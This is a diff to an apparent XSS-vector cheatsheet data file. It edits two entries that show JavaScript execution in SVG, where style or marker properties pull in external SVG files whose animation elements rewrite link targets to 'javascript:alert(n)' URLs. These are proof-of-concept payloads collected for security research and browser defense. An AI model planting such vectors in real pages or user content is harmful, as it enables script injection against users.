@@ -3353,14 +3353,8 @@ var items =
             'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (1)',
             'de' : ''
         },
-        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n\n</svg>',
-        'attachment' : {
-            'required_mime' : 'image/svg+xml',
-            'samedomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test3.svg',
-            'name'          : 'test3.svg',
-            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" />\n</linearGradient>\n\n</svg>'
-        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
+
         'description': {
             'en' : 'SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.',
             'ja' : '',
@@ -3389,7 +3383,14 @@ var items =
             'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (2)',
             'de' : ''
         },
-        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<path d="M0,0" marker-start="url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCjxtYXJrZXIgaWQ9ImEiICBtYXJrZXJXaWR0aD0iMTAwMCIgbWFya2VySGVpZ2h0PSIxMDAwIiByZWZYPSIwIiByZWZZPSIwIj4NCjxhIHhsaW5rOmhyZWY9Imh0dHA6Ly9nb29nbGUuY29tIj48c2V0IGF0dHJpYnV0ZU5hbWU9InhsaW5rOmhyZWYiIHRvPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIiBiZWdpbj0iMXMiIC8+DQo8cmVjdCB3aWR0aD0iMTAwMCIgaGVpZ2h0PSIxMDAwIiBmaWxsPSJ3aGl0ZSIvPjwvYT4NCjwvbWFya2VyPg0KPC9zdmc+#a)"/>\n\n</svg>',
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<path d="M0,0" marker-start="url(test4.svg#a)"/>\n\n</svg>',
+        'attachment' : {
+            'required_mime' : 'image/svg+xml',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test4.svg',
+            'name'          : 'test4.svg',
+            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<marker id="a"  markerWidth="1000" markerHeight="1000" refX="0" refY="0">\n<a xlink:href="http://google.com">\n<set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" />\n<rect width="1000" height="1000" fill="white"/>\n</a>\n</marker>\n</svg>'
+        },
         'description': {
             'en' : 'This example shows how the property "marker" allows to insert into the current document is an external link with JavaScript: URL.',
             'ja' : '',
